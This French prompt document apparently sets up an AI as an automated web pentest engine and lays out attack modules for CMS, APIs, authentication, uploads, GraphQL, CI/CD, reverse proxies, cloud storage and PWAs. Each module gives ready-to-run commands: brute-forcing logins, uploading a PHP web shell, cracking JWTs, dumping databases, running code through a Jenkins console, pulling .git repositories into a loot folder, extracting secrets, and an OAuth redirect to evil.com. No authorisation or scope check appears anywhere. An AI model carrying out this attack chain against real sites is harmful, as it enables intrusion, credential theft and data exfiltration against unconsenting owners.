**GIGAPROMPT STRATÉGIQUE : INFRASTRUCTURE WEB GÉNÉRALISÉE (MOTEUR HEURISTIQUE À RÉACTION CONTEXTUELLE)**

---

**CONCEPT :**
Ce gigaprompt fonctionne comme un **moteur de raisonnement adaptatif**.
Il simule un comportement de **pentester expert**, s'appuyant sur des signaux de reconnaissance, des hypothèses de vulnérabilité, et des chaînes de décision dynamiques.

Il se base sur une structure de prompt modulaire composée de moteurs spécialisés.
Chaque moteur analyse un contexte, infère un risque, et génère une suite d’actions personnalisées, non prédéfinies.

---

## 🧠 [TYPE_ABSTRAIT] HeuristicReactionEngine
```
HeuristicReactionEngine {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(next: NextStep) → CommandePentest[]
}
```

## 📦 [TYPE_ABSTRAIT] WebTarget
```
WebTarget {
    domain: string,
    ip: string,
    headers: [Header],
    technologies: [Tech],
    fingerprint: [Framework],
    cms: [WordPress | Drupal | Joomla | Magento]?,
    api: [REST | GraphQL]?,
    auth: [JWT | OAuth2 | SSO]?,
    pwa: boolean,
    reverse_proxy: boolean,
    ci_cd: [GitLab | Jenkins | GitHubActions]?,
    cloud: [AWS | GCP | Azure]?,
    waf: [WAF],
    suspicion_paths: [URI],
    raw_signals: [Signal],
    vuln_surface: [VulnContext]
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal
```
Signal {
    source: string,
    type: Header | URI | Body | Cookie | JS | ResponseCode,
    content: string,
    confidence: Low | Medium | High,
    metadata: any
}
```

## 💡 [TYPE_ABSTRAIT] Hypothesis
```
Hypothesis {
    type: VulnType,
    evidence: Signal[],
    probable_cwe: [CWE],
    impact: Low | Medium | High | Critical,
    confirmed: boolean,
    test_plan: Experiment[]
}
```

## 🔬 [TYPE_ABSTRAIT] Experiment
```
Experiment {
    outil: string,
    arguments: string,
    precondition: string,
    expected_outcome: string,
    post_action: string
}
```

## 👁️ [TYPE_ABSTRAIT] Observation
```
Observation {
    result: string,
    response: any,
    confirmed: boolean,
    notes: string
}
```

## 🧩 [TYPE_ABSTRAIT] NextStep
```
NextStep {
    decision_type: enum<Continue | Escalate | Branch | Stop>,
    description: string,
    command: CommandePentest
}
```

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```
CommandePentest {
    tool: string,
    full_command: string,
    description: string,
    when_to_execute: string
}
```

---

## ⚙️ MOTEURS SPÉCIALISÉS
Chaque moteur suivant implémente le `HeuristicReactionEngine` :

- `engine_web_cms(target: WebTarget)`
- `engine_web_api(target: WebTarget)`
- `engine_web_auth(target: WebTarget)`
- `engine_web_upload(target: WebTarget)`
- `engine_web_graphql(target: WebTarget)`
- `engine_web_ci_cd(target: WebTarget)`
- `engine_web_cloud(target: WebTarget)`

Ces moteurs réagissent à des `Signal` détectés dynamiquement (pas des patterns statiques !).

---

## 🔁 Exécution générique (pseudocode stratégique)

1. `target = reconnaissanceInitiale(input)`
2. `signals = observe(target)`
3. `for signal in signals:`
   - `hypothesis = match(signal)`
   - `experiments = test(hypothesis)`
   - `for exp in experiments:`
     - `obs = execute(exp)`
     - `steps = reason(obs)`
     - `for step in steps:`
         - `react(step)`

---

### ⚙️ MODULE : engine_web_cms(target: WebTarget)

1. **Observation CMS** : Signaux typiques
    - URI: `/wp-login.php`, `/administrator/`, `/user/login`, `/sites/all`, `/skin/frontend`
    - Headers: `X-Generator`, `X-Powered-By`, HTML Comments
    - HTML Markers: `wp-content`, `drupal.js`, `joomla`, `magento`

2. **Matching Hypothèses**
    - Failles connues par CMSmap
    - Faille d’upload ou plugin vulnérable (CVE)
    - Bruteforce possible (login exposed)

3. **Test Plans**
```
- outil: whatweb / wpscan / droopescan
- test bruteforce : hydra / wpscan --passwords
- fuzz plugins vulnérables : nuclei -t cms/wordpress/ -u $target
- CVE plugin/module détecté → CVE lookup
```

4. **Exécution conditionnelle**
    - Si `wp-login.php` → bruteforce
    - Si plugin détecté vulnérable (CVE) → exploit
    - Si `/upload.php` ou `/media/new` → test upload RCE (php shell)

5. **Réaction**
    - Si accès admin → dump DB (sqlmap or panel abuse)
    - Si shell → enum OS, lateral move
    - Si user faible → test reuse + login webmail, phpmyadmin

6. **Commandes typiques générées**
```
- wpscan --url https://target --enumerate p --plugins-detection aggressive
- nuclei -u https://target -t cves/wordpress/
- curl -X POST -F "file=@shell.php" https://target/wp-content/uploads/
- hydra -L users.txt -P rockyou.txt target http-post-form "/wp-login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

---

### ⚙️ MODULE : engine_web_api(target: WebTarget)

1. **Observation API** : Signaux typiques
    - Headers: `Content-Type: application/json`, `X-Api-Version`, `Server: Express`
    - URIs: `/api/`, `/v1/`, `/swagger`, `/graphql`, `/openapi.json`, `/docs`
    - JS: `fetch('/api')`, `axios.post`, `GraphQLClient`

2. **Matching Hypothèses**
    - Verb tampering possible (GET vs POST)
    - API key dans l’URL ou exposée dans JS
    - JWT faible ou predictable
    - Injection JSON ou GraphQL
    - Broken Object Level Auth (BOLA)

3. **Test Plans**
```
- nuclei -t exposed-tokens, misconfigured-api
- ffuf ou feroxbuster sur `/api/`
- jwt_tool --analyze --crack
- curl avec tampering: GET au lieu de POST, POST → PUT
- burp intruder sur `id` dans le JSON body
- sqlmap --data='{"id":"1"}' --dbs
```

4. **Exécution conditionnelle**
    - Si API key trouvée → test injection + auth abuse
    - Si JWT → brute HS256
    - Si swagger ou OpenAPI → import et test endpoints
    - Si GraphQL → introspection + injection + alias chaining

5. **Réaction**
    - Si auth contournée → accès admin ou dump data
    - Si injection → extraction base
    - Si endpoint destructif → appel abusif (ex: DELETE)

6. **Commandes typiques générées**
```
- nuclei -u https://target -t vulnerabilities/misconfigured-api/
- jwt_tool jwt.txt -C -d wordlist.txt
- sqlmap -u https://target/api/product -p id --data='{ "id":1 }' --dbs
- curl -X PUT https://target/api/user/2 -d '{"admin":true}' -H 'Authorization: Bearer <jwt>'
- graphqlmap -u https://target/graphql --introspect --method POST
```

---

### ⚙️ MODULE : engine_web_auth(target: WebTarget)

1. **Observation AUTH** : Signaux typiques
    - Headers : `Authorization`, `Set-Cookie`, `WWW-Authenticate`, `X-Auth-Token`
    - URIs : `/login`, `/auth`, `/token`, `/oauth/`, `/sso/`
    - Cookies : `session=`, `JWT=`, `sso_token`, `auth_token`
    - JS : `localStorage.setItem('token', ...)`, `Bearer `

2. **Matching Hypothèses**
    - Bruteforce ou enumeration d’utilisateurs
    - Session fixation ou token prévisible
    - JWT HS256 sans signature
    - Bypass login (via status, redirect, header inject)
    - Authentification broken flow (OAuth2 redirect hijack)

3. **Test Plans**
```
- hydra / medusa bruteforce
- jwt_tool --analyze --crack
- nuclei -t token-leaks / auth-bypass
- curl POST auth/login -d user=admin, test reset / logic flaw
- tamper OAuth2 redirect_uri (test hijack)
- feroxbuster / gobuster sur `/sso/` ou `/token/`
```

4. **Exécution conditionnelle**
    - Si JWT → brute ou modification HS256
    - Si token faible dans cookie → reuse or tampering
    - Si bypass HTTP 302/200 sans auth → replay / abuse

5. **Réaction**
    - Si login contourné → recherche escalade ou admin
    - Si JWT modifié accepté → admin override
    - Si session abuse → token spread ou internal enum

6. **Commandes typiques générées**
```
- jwt_tool eyJ0eXAi... -C -d /usr/share/wordlists/jwt-secrets.txt
- curl -X POST https://target/login -d 'username=admin&password=wrong' -i
- nuclei -u https://target -t auth-bypass/logic-issue.yaml
- curl -X POST https://target/oauth2/token -d 'redirect_uri=https://evil.com'
- hydra -L users.txt -P rockyou.txt https-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
```

---

### ⚙️ MODULE : engine_web_upload(target: WebTarget)

1. **Observation UPLOAD** : Signaux typiques  
   - URIs : `/upload`, `/media/new`, `/admin/upload`, `/import`, `/ajax/upload`  
   - Inputs HTML : `<input type="file">`, `<form enctype="multipart/form-data">`  
   - JS : `FormData`, `reader.readAsDataURL`, `xhr.send(file)`  
   - Requêtes POST multipart avec champ `filename`  

2. **Matching Hypothèses**  
   - Absence de validation côté serveur  
   - Contrôle uniquement côté client (JS)  
   - Pas de vérification MIME ou extension  
   - Répertoire de destination accessible (indexation ou exécution possible)  
   - Risque de RCE si fichiers PHP, ASP, JSP, etc. autorisés  
   - Contournement possible via double extensions, case-bypass, MIME spoofing  

3. **Test Plans**
```
- curl -F "file=@shell.php" https://target/upload
- curl -F "file=@evil.jpg.php" -H "Content-Type: image/jpeg"
- feroxbuster / gobuster sur /uploads/, /files/, /documents/
- nuclei -t file-upload-bypass.yaml
- upload LFI wrapper (ex: .htaccess + .php file)
- burp upload scanner + payloads all extensions
```

4. **Exécution conditionnelle**
   - Si `/upload` détecté → test direct RCE avec payload  
   - Si fichier accessible après upload → tentative d’exécution  
   - Si erreur MIME → test spoofing via `Content-Type`, exiftool  
   - Si fichier renommé mais conservé côté serveur → brute URI ou LFI  

5. **Réaction**
   - Shell PHP OK ? → enum système + pivot  
   - Upload accessible ? → persist, test reverse shell  
   - Pas d’accès au fichier ? → test indirect avec LFI  
   - Accès partiel ? → bypass `.htaccess`, injection header  

6. **Commandes typiques générées**
```
- curl -F "file=@shell.php" https://target/upload
- curl -F "file=@evil.jpg.php" -H "Content-Type: image/jpeg" https://target/admin/import
- feroxbuster -u https://target -w upload-dir.txt -x php,jpg,php5,txt
- curl https://target/uploads/shell.php
- burp repeater → POST multipart (analyser réponse, bypass)
- echo '<?php system($_GET["cmd"]); ?>' > cmd.php && upload
```

---

### ⚙️ MODULE : engine_web_graphql(target: WebTarget)

1. **Observation GRAPHQL** : Signaux typiques
   - URI : `/graphql`, `/graphiql`, `/gql`, `/api/graphql`
   - Requêtes POST avec `{ "query":` dans le body
   - JS : `ApolloClient`, `graphql-request`, `useQuery`, `fetchGraphQL`
   - Headers : `Content-Type: application/json`, `X-GraphQL-Operation-Name`

2. **Matching Hypothèses**
   - Introspection activée
   - Mauvaise gestion des permissions sur les types
   - Possibilité de nested queries (alias chaining)
   - Injections GraphQL (`__type`, `__schema`, variables non typées)
   - Bruteforce de champs / enumérations

3. **Test Plans**
```
- curl -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'
- graphqlmap --introspect --method POST --url https://target/graphql
- nuclei -t misconfigured-graphql.yaml
- graphql-cop --url https://target/graphql
- graphql-voyager import schema via introspection
- gql-fuzzer (fuzz field + variable injection)
```

4. **Exécution conditionnelle**
   - Si introspection activée → dump types et fields
   - Si réponse avec structure JSON field-level → test logique accès
   - Si mutation disponible → test CRUD ou exec fonctions
   - Si login via GraphQL → bruteforce user/password fields

5. **Réaction**
   - Si admin fields exposés → escalade
   - Si mutation non protégée → création/délégation d’objets
   - Si injection → dump ou SSRF selon structure
   - Si erreurs détaillées → fingerprint framework (Ariadne, Apollo, etc.)

6. **Commandes typiques générées**
```
- curl -X POST https://target/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } }"}'
- graphqlmap -u https://target/graphql --introspect
- nuclei -u https://target -t graphql/graphql-introspection.yaml
- gql-fuzzer -t https://target/graphql -v -m POST
- echo '{"query": "mutation{createUser(username:\"test\",password:\"test\"){id}}"}' | curl -X POST -H "Content-Type: application/json" --data @- https://target/graphql
```

---

### ⚙️ MODULE : engine_web_ci_cd(target: WebTarget)

1. **Observation CI/CD** : Signaux typiques
   - URIs : `/jenkins`, `/gitlab`, `/ci`, `/build`, `/pipeline`, `/job/`
   - Headers : `X-Jenkins`, `X-Gitlab-Event`, `X-Gitlab-Token`
   - Public `.git/`, `.env`, `.gitlab-ci.yml`, `jenkinsfile` ou `/logs/`
   - Repositories ouverts ou leaks `.git/config`, `config.json`, `token` dans HTML

2. **Matching Hypothèses**
   - Exposition de serveurs CI sans auth ou avec creds par défaut
   - Fuite d’artefacts ou d’archives de build
   - Possibilité d’exécution RCE via console Jenkins, jobs GitLab
   - Secrets stockés en clair dans les pipelines
   - Accès direct aux logs ou archives compilées

3. **Test Plans**
```
- nuclei -t exposures/ci-jenkins.yaml
- nuclei -t exposures/ci-gitlab.yaml
- dirsearch /feroxbuster sur /.git/, /pipeline/, /artifacts/
- curl https://target/.env / .git/config / .gitlab-ci.yml
- git-dumper https://target/.git /tmp/loot.git
- test Jenkins script console with: script=whoami
- if GitLab open API → /api/v4/projects & /pipelines
```

4. **Exécution conditionnelle**
   - Jenkins : accès console → test RCE Java
   - GitLab : si projets visibles → fetch .git ou pipelines
   - Build logs : recherche tokens, clés API, fichiers .pem
   - `.env` ou `yml` leak → grep secrets

5. **Réaction**
   - Secrets trouvés → re-auth ou pivot
   - Pipeline accessible → injection de shell build
   - Jenkins accessible → exécution Java, netcat reverse
   - GitLab public → exfil .git + artefacts

6. **Commandes typiques générées**
```
- curl https://target/.gitlab-ci.yml
- nuclei -u https://target -t exposures/jenkins-script-console.yaml
- curl -X POST -d 'script=whoami' https://target/scriptText
- git-dumper https://target/.git /tmp/loot
- grep -iR 'token\|key\|password' /tmp/loot
- feroxbuster -u https://target -w ci-paths.txt
- curl https://target/pipelines/last/build.log
```

---

### ⚙️ MODULE : engine_web_reverse_proxy(target: WebTarget)

1. **Observation REVERSE PROXY** : Signaux typiques
   - Headers : `X-Forwarded-For`, `X-Real-IP`, `X-Original-URL`, `X-Client-IP`
   - Comportements variables selon IP ou origine
   - URI : `/admin`, `/internal`, `/debug`, `/nginx_status`
   - Réponse 403/401 changeant selon User-Agent ou IP

2. **Matching Hypothèses**
   - Reverse proxy vulnérable (misconfig, filtre côté frontend)
   - Bypass ACL ou auth via header IP spoofing
   - SSRF interne via `Host`, `X-Forwarded-Host`, `X-Original-URL`
   - Cache poisoning sur CDN ou frontend

3. **Test Plans**
```
- curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin
- curl -H "X-Original-URL: /debug" https://target/
- curl -H "Host: 127.0.0.1" https://target/
- test SSRF: burp collaborator / dnslog.cn / requestbin
- nuclei -t reverse-proxy-misconfig.yaml
```

4. **Exécution conditionnelle**
   - Si accès différencié selon IP → forcer IP loopback
   - Si accès `/admin` avec `X-Forwarded-For` → escalade
   - Si erreurs 403 → alterner header / User-Agent / Host

5. **Réaction**
   - Accès admin autorisé ? → chercher panel ou RCE
   - SSRF → explorer ports locaux (169.254, 127.0.0.1)
   - Si cache control faible → test cache poisoning (invalide + payload)

6. **Commandes typiques générées**
```
- curl -H "X-Forwarded-For: 127.0.0.1" https://target/internal
- curl -H "X-Original-URL: /admin" https://target/
- curl -H "X-Host: localhost" https://target/
- curl -H "X-Forwarded-For: evil.com" -H "Host: 127.0.0.1" https://target/
- nuclei -u https://target -t reverse-proxy-bypass.yaml
```

---

### ⚙️ MODULE : engine_web_cloud_hosting(target: WebTarget)

1. **Observation CLOUD HOSTING** : Signaux typiques
   - URIs : `s3.amazonaws.com`, `.blob.core.windows.net`, `firebaseio.com`, `storage.googleapis.com`
   - Références dans JS : `AWS.config.update`, `firebase.initializeApp`, `GCP_TOKEN=`
   - CNAME : pointing vers CDN (CloudFront, AzureCDN, etc.)
   - `robots.txt`, `.env`, ou `.well-known/assetlinks.json`

2. **Matching Hypothèses**
   - Buckets S3/Azure/Google publics ou mal configurés
   - Secrets exposés dans JS, config ou metadata
   - Takeover DNS (CNAME → domaine inexistant)
   - Fuite via fichiers .bak, .json, .env, config.yml

3. **Test Plans**
```
- aws s3 ls s3://target-bucket --no-sign-request
- az storage blob list -c container --account-name name --public-access
- nuclei -t cloud/takeover-s3.yaml
- subjack -w domains.txt -t 100 -ssl
- curl https://storage.googleapis.com/target/file.json
- feroxbuster -u https://target -x .json,.yml,.env,.bak
```

4. **Exécution conditionnelle**
   - Si CNAME mal pointé → test takeover
   - Si réponse 200 S3 blob list → extraction mass
   - Si fichiers `.env`, `.bak` → grep credentials
   - JS leak → recherche clés : `AKIA`, `AIza`, `ghp_`, `firebase`

5. **Réaction**
   - Secret trouvé → test re-auth ou pivot
   - Takeover possible → deploy PoC (404 → control)
   - Fichier config → injection ou privilège escaladé

6. **Commandes typiques générées**
```
- aws s3 ls s3://vuln-bucket --no-sign-request
- curl https://target/.env | grep -i 'secret\|token\|pass'
- subfinder -d target.com | subjack -t 50 -ssl -v
- nuclei -u https://target -t cloud/config-leaks.yaml
- curl https://target.westeurope.blob.core.windows.net/container/.env
```

---

### ⚙️ MODULE : engine_web_pwa(target: WebTarget)

1. **Observation PWA** : Signaux typiques
   - Fichier `manifest.json` ou `manifest.webmanifest`
   - Présence de Service Workers (`sw.js`, `service-worker.js`)
   - API Cache Storage utilisée dans JS (`caches.open`, `fetch`, `install`, `activate`)
   - URIs : `/offline`, `/manifest.json`, `/sw.js`

2. **Matching Hypothèses**
   - Service worker mal codé (cache injection, absence de contrôle d'origine)
   - Fichier manifest ou JS offline accessible et modifiable (XSS potentiel)
   - Abuse possible du cache (poisoning)
   - Manipulation de routes offline pour exploiter des URL cachées

3. **Test Plans**
```
- curl https://target/manifest.json
- curl https://target/sw.js
- feroxbuster -u https://target -x .js,.json --depth 2
- test injection dans manifest: "start_url": "<script>alert(1)</script>"
- observer fetch events et simuler injection via devtools offline
- Burp extension: PWA Attack Surface Mapper
```

4. **Exécution conditionnelle**
   - Si manifest détecté → analyser permissions et `start_url`
   - Si Service Worker → observer script et routes interceptées
   - Si fetch-cache → injecter ou modifier responses (poison)
   - Offline access → simuler pour identifier vecteurs cachés

5. **Réaction**
   - Manifest modifiable → injection XSS ou bypass
   - Service worker vulnérable → re-route, persistence malicieuse
   - Cache API exploité → serve payload offline

6. **Commandes typiques générées**
```
- curl https://target/manifest.json | jq .
- curl https://target/sw.js
- feroxbuster -u https://target -x .json,.js --depth 2
- curl -X GET "https://target/sw.js" -H "Referer: https://evil.com"
- test offline hijack: simulate cache.write("/index.html", payload)
```

---

## ⚙️ MOTEUR PRINCIPAL : engine_web_final(target: WebTarget)

Ce moteur déclenche les modules suivants selon les patterns observés :

- `engine_web_cms()`
- `engine_web_api()`
- `engine_web_auth()`
- `engine_web_upload()`
- `engine_web_graphql()`
- `engine_web_ci_cd()`
- `engine_web_cloud_hosting()`
- `engine_web_reverse_proxy()`
- `engine_web_pwa()`

---

## 🧠 ANALYSE HEURISTIQUE INITIALE

1. **Détection intelligente de patterns :**
    - `curl -I`, `nmap`, `whatweb`, `feroxbuster`, `nuclei`
    - Fichiers : `.git`, `.env`, `manifest.json`, `openapi.json`
    - En-têtes HTTP : `X-Powered-By`, `X-Jenkins`, `Authorization`
    - URI : `/graphql`, `/api`, `/admin`, `/upload`, `/pipeline`

2. **Exemples de commandes exécutées automatiquement :**
```bash
nmap -sV -p 80,443 --script http-headers,http-title -T4 <target>
whatweb -v https://<target>
curl -I https://<target>
nuclei -u https://<target> -tags exposures,technologies
feroxbuster -u https://<target> -x .php,.json,.bak,.yml,.env
```

---

## 🔗 CORRESPONDANCE DES PATTERNS → MODULES

| Pattern détecté                                     | Module déclenché               |
|-----------------------------------------------------|---------------------------------|
| `/wp-login.php`, `wp-json`                          | `engine_web_cms()`             |
| `/api`, `swagger`, `json`, `application/json`       | `engine_web_api()`             |
| `/login`, `JWT`, `oauth`, `sso`, cookies sensibles  | `engine_web_auth()`            |
| `multipart/form-data`, fichier upload               | `engine_web_upload()`          |
| `/graphql`, introspection, `ApolloClient`           | `engine_web_graphql()`         |
| `.gitlab-ci.yml`, `/jenkins`, `pipeline`            | `engine_web_ci_cd()`           |
| `X-Forwarded-For`, `Host: 127.0.0.1`, `/internal`   | `engine_web_reverse_proxy()`   |
| `manifest.json`, `sw.js`, `caches.open`             | `engine_web_pwa()`             |
| `s3.amazonaws.com`, `.blob.core.windows.net`        | `engine_web_cloud_hosting()`   |

---

## 🔁 CHAÎNE D'ORCHESTRATION AUTOMATIQUE

### Pseudocode :
```plaintext
target = reconnaissance_initiale(input)
signals = observe(target)

for signal in signals:
    hypothesis = match(signal)
    experiments = test(hypothesis)
    
    for exp in experiments:
        observation = execute(exp)
        steps = reason(observation)
        
        for step in steps:
            react(step)
```

---

## 📂 OUTPUTS ATTENDUS

- 📁 `/output/web/<target>/cms/`
- 📁 `/output/web/<target>/api/`
- 📁 `/output/web/<target>/graphql/`
- 📁 `/output/web/<target>/auth/`
- 📁 `/output/web/<target>/pwa/`
- 📁 `/output/web/<target>/ci_cd/`
- 📁 `/output/web/<target>/cloud/`
- 📁 `/output/web/<target>/reverse_proxy/`

---

## 🛠️ PARAMÉTRAGE DYNAMIQUE PAR PROFIL

Définissez un profil personnalisé avec :

```bash
TARGET=https://vulnerable.site
PROFILE=web_graphql_auth
MODE=deep
LOG_PATH=/output/web/vulnerable.site/
```

---

## 🔐 GÉNÉRATION DES COMMANDES PENTEST

Chaque module renvoie :

- Des commandes prêtes à l'emploi (curl, sqlmap, nuclei...)
- Des scripts `.bat` ou `.sh` selon système
- Des logs exploitables par un outil comme Darkmoon

---

## 🔄 LOGIQUE MULTI-CYCLE : ORCHESTRATION INTELLIGENTE

Le moteur réévalue les signaux après chaque exécution :

- Si `/admin` découvert après CMS → relance `engine_web_auth`
- Si token JWT apparaissent → relance `jwt_tool` dans `engine_web_auth`
- Si GraphQL + CMS → pivot entre `graphql` et `cms`
- Si secrets détectés dans `.env` ou S3 → module `engine_web_cloud_hosting()`

---

## ✅ FINALITÉ

- 💥 Générer un scénario d'attaque actionnable, complet, ciblé
- 🎯 S’adapter à tout type d’infrastructure Web
- 🧠 Exploiter toutes les surfaces d’attaque détectables par reconnaissance
- 🗂️ Centraliser toutes les informations dans une arborescence claire et exploitable

---

#### 🔍 1. PHASE DE RECONNAISSANCE INTELLIGENTE

1.1. **Détection des patterns et indices structurels** :
- Analyse des URI : `/wp-content`, `/graphql`, `/gitlab`, `/manifest.json`, `/admin`, `/api`, etc.
- Analyse des JS, réponses HTTP, headers spécifiques (`X-Frame-Options`, `X-Jenkins`, etc.)
- Analyse DNS et TLS : CNAME → Cloud, certificats, tech stack (`Subject CN`, `Issuer`, etc.)
- Détection d’infrastructures multi-applications

1.2. **Commandes automatiques exécutées :**
```
- whatweb -v https://target
- nmap -sV -p 80,443 --script=http-headers,http-title -T4 target
- curl -I https://target
- nuclei -u https://target -tags exposures,technologies,misconfig
- feroxbuster -u https://target -x .php,.json,.bak,.yml,.env
```

---

#### 🧠 2. MOTEUR DE DÉTECTION PAR MODULE

En fonction des patterns détectés automatiquement, le moteur déclenche un ou plusieurs modules spécialisés :

| Pattern détecté | Module activé |
|-----------------|----------------|
| `/wp-content`, `wp-json` | engine_web_cms() |
| `/api`, `application/json`, `swagger.json` | engine_web_api() |
| `.gitlab-ci.yml`, `/jenkins`, `/job/` | engine_web_ci_cd() |
| `X-Forwarded-For`, `/admin`, erreurs variables | engine_web_reverse_proxy() |
| `graphql`, `POST { query: ... }` | engine_web_graphql() |
| `/manifest.json`, `service-worker.js` | engine_web_pwa() |
| `s3.amazonaws.com`, `.blob.core.windows.net` | engine_web_cloud_hosting() |
| `multipart/form-data`, upload features | engine_web_upload() |
| `login`, `JWT`, `oauth`, `sso` | engine_web_auth() |

---

#### 🔁 3. CHAÎNE DE TRAITEMENT HEURISTIQUE

Chaque module déclenche :
1. **Reconnaissance ciblée** (fichiers, endpoints, headers)
2. **Tests conditionnels** (injections, bypass, SSRF, IDOR...)
3. **Réactions adaptatives** (pivot, escalade, credentials, RCE)

---

#### 🛠️ 4. GÉNÉRATION DE SCRIPTS AUTOMATIQUES

À chaque étape, les résultats obtenus peuvent générer :
- un script batch complet pour automatiser les tests
- une liste de commandes CLI exploitables immédiatement
- une extraction de vulnérabilités avec des recommandations d’exploitation éthique

---

#### 📊 5. ADAPTATION PAR PROFIL & PARAMÈTRES

Ce module accepte des **profils prédéfinis ou dynamiques** comme :
```
web_corp, web_api_ext, web_cms_light, web_graphql_auth, web_cloud_pwa
```

Et accepte les **paramètres manuels ou auto-importés** :
```
TARGET=https://target.com
MODE=deep
LEVEL=3
PROFILE=web_cms_light
```
